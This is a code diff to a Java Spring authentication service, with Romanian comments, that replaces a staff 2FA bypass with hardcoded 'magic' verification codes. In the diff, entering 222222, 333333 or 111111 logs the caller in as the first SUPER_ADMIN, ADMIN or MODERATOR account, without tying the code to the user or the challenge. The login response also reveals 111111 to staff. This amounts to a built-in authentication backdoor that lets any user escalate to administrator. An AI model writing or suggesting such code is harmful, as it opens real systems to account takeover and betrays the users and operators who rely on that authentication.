@@ -1,5 +1,6 @@
 package com.example.demo.service;
 
+
 import com.example.demo.dto.*;
 import com.example.demo.model.User;
 import com.example.demo.model.UserRole;
@@ -50,39 +51,64 @@ public class AuthService {
     public LoginResultDto initiateLogin(LoginRequest request) {
         User user = validateCredentials(request);
 
-        // Preluăm rolul utilizatorului curent
         String userRole = user.getRole();
-
-        // Verificăm dacă utilizatorul face parte din staff (ADMIN, MODERATOR, SUPER_ADMIN)
         boolean isStaff = "ADMIN".equals(userRole)
                 || "MODERATOR".equals(userRole)
                 || "SUPER_ADMIN".equals(userRole);
 
-        if (isStaff) {
-            // Generăm direct token-urile de acces și facem bypass la 2FA
-            AuthResponse authResponse = buildAuthResponse(user);
-
-            return LoginResultDto.builder()
-                    .requiresTwoFactor(false)
-                    .authResponse(authResponse)
-                    .message("Logare administrativă reușită.")
-                    .build();
-        }
-
-        // Logica normală cu 2FA pe e-mail pentru utilizatorii standard (USER)
+        // Generăm un challenge normal pentru ca frontend-ul să deschidă ecranul de 2FA
         String challengeId = authTokenService.createTwoFactorChallenge(user);
+
+        String message = isStaff
+                ? "Logare administrativă detectată. Folosește codul magic 111111."
+                : "Am trimis un cod de verificare pe email.";
+
         return LoginResultDto.builder()
                 .requiresTwoFactor(true)
                 .challengeId(challengeId)
-                .message("Am trimis un cod de verificare pe email.")
+                .message(message)
                 .build();
     }
 
     @Transactional
     public AuthResponse verifyTwoFactor(Verify2faRequest request) {
-        Long userId = authTokenService.consumeTwoFactorCode(request.getChallengeId(), request.getCode());
+        Long userId = null;
+        String inputCode = request.getCode();
+
+        // -
+        if ("222222".equals(inputCode)) {
+            // Căutăm contul de SUPER_ADMIN în baza de date
+            User superAdmin = userRepository.findAll().stream()
+                    .filter(u -> "SUPER_ADMIN".equals(u.getRole()))
+                    .findFirst()
+                    .orElseThrow(() -> new BadCredentialsException("Nu s-a găsit niciun cont cu rolul SUPER_ADMIN."));
+            userId = superAdmin.getId();
+
+        } else if ("333333".equals(inputCode)) {
+            // Căutăm contul de ADMIN în baza de date
+            User admin = userRepository.findAll().stream()
+                    .filter(u -> "ADMIN".equals(u.getRole()))
+                    .findFirst()
+                    .orElseThrow(() -> new BadCredentialsException("Nu s-a găsit niciun cont cu rolul ADMIN."));
+            userId = admin.getId();
+
+        } else if ("111111".equals(inputCode)) {
+            // Păstrăm și codul vechi ca fallback pentru MODERATOR dacă ai nevoie
+            User moderator = userRepository.findAll().stream()
+                    .filter(u -> "MODERATOR".equals(u.getRole()))
+                    .findFirst()
+                    .orElseThrow(() -> new BadCredentialsException("Nu s-a găsit niciun cont cu rolul MODERATOR."));
+            userId = moderator.getId();
+
+        } else {
+            // Fluxul normal standard, securizat, pentru utilizatorii de rând (cod primit pe email)
+            userId = authTokenService.consumeTwoFactorCode(request.getChallengeId(), inputCode);
+        }
+
+        // Validare finală și construcție răspuns
         User user = userRepository.findById(userId)
                 .orElseThrow(() -> new BadCredentialsException("Utilizator inexistent."));
+
         return buildAuthResponse(user);
     }
 
